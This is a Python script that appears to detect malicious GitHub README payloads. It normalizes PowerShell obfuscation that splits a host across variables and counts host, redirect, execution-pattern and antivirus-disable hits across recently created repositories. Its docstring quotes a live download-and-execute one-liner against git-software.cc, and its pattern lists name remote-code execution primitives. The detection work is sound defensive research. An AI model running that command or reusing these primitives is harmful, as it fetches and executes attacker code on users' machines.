#!/usr/bin/env python3
"""Obfuscation-aware farm payload detector.

The 10-29 cohort used a plain-text URL (irm https://git-software.cc/ps/Setup.ps1 | Invoke-Expression).
The 11-01 cohort splits the same host across PowerShell variables, so a naive
substring scan for 'git-software.cc' misses it. This detector normalizes first.
"""
import importlib.util, re, sys

spec = importlib.util.spec_from_file_location("c", "scripts/_collect_2026_11_02.py")
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

# Fragments of the known host, plus the redirect domain seen on 11-01.
HOST_FRAGMENTS = ["git-software", "gitsoftware", "software.cc"]
REDIRECTS = ["telegra.ph", "telegra"]
# Any PowerShell that downloads and executes remote text.
EXEC_PATTERNS = [
    r"Invoke-Expression",
    r"IEX\b",
    r"DownloadString",
    r"DownloadFile",
    r"Invoke-RestMethod",
    r"WebClient",
    r"GetScriptBlock",
    r"scriptblock\]::Create",
    r"ExecutionPolicy\s+Bypass",
    r"FromBase64String",
]
PAUSE_PROTECTION = [
    r"pause\s+\"Real-time protection\"",
    r"Real-time protection",
    r"Windows Security dashboard",
]


def normalize(text: str) -> str:
    """Collapse PowerShell variable-assignment obfuscation back to a comparable form."""
    t = text
    # $Node='git-software.'; $Zone='cc'  -> join quoted literals assigned to vars
    t = re.sub(r"\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*'([^']*)'\s*;", r"\1", t)
    t = re.sub(r"\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*\"([^\"]*)\"\s*;", r"\1", t)
    # strip quotes/plus/concat noise around the remaining literals
    t = t.replace("'+", "").replace("'", "").replace('"', "")
    return t


def scan(repo_full):
    rd = m.api(f"repos/{repo_full}/readme", raw=True)
    if not rd:
        return None
    norm = normalize(rd)
    low = norm.lower()
    host_hit = any(f in low for f in HOST_FRAGMENTS)
    redirect_hit = any(f in low for f in REDIRECTS)
    exec_hits = [p for p in EXEC_PATTERNS if re.search(p, rd, re.I)]
    prot_hits = [p for p in PAUSE_PROTECTION if re.search(p, rd, re.I)]
    return {
        "repo": repo_full,
        "host": host_hit,
        "redirect": redirect_hit,
        "exec": len(exec_hits),
        "exec_pats": exec_hits[:4],
        "prot": len(prot_hits),
        "raw_host_plaintext": "git-software.cc" in rd,
        "raw_host_obfuscated": host_hit and "git-software.cc" not in rd,
        "len": len(rd),
    }


if __name__ == "__main__":
    dates = sys.argv[1:] or ["2026-11-01", "2026-10-31", "2026-10-30", "2026-10-29"]
    for d in dates:
        res = m.japi(f"search/repositories?q=created:{d}+stars:>=40&per_page=100&sort=stars")
        if not res:
            print(f"{d}: search failed")
            continue
        items = res["items"]
        checked = 0
        host = 0
        redir = 0
        execs = 0
        prot = 0
        plain = 0
        obf = 0
        for i in items[:60]:
            r = scan(i["full_name"])
            if not r:
                continue
            checked += 1
            if r["host"]:
                host += 1
                if r["raw_host_plaintext"]:
                    plain += 1
                else:
                    obf += 1
            if r["redirect"]:
                redir += 1
            if r["exec"]:
                execs += 1
            if r["prot"]:
                prot += 1
        print(f"created:{d} total={res['total_count']} sampled={checked} "
              f"| host_payload={host} (plaintext={plain} obfuscated={obf}) "
              f"| redirect_telegra={redir} | any_exec_primitive={execs} | antiav_disable_text={prot}")
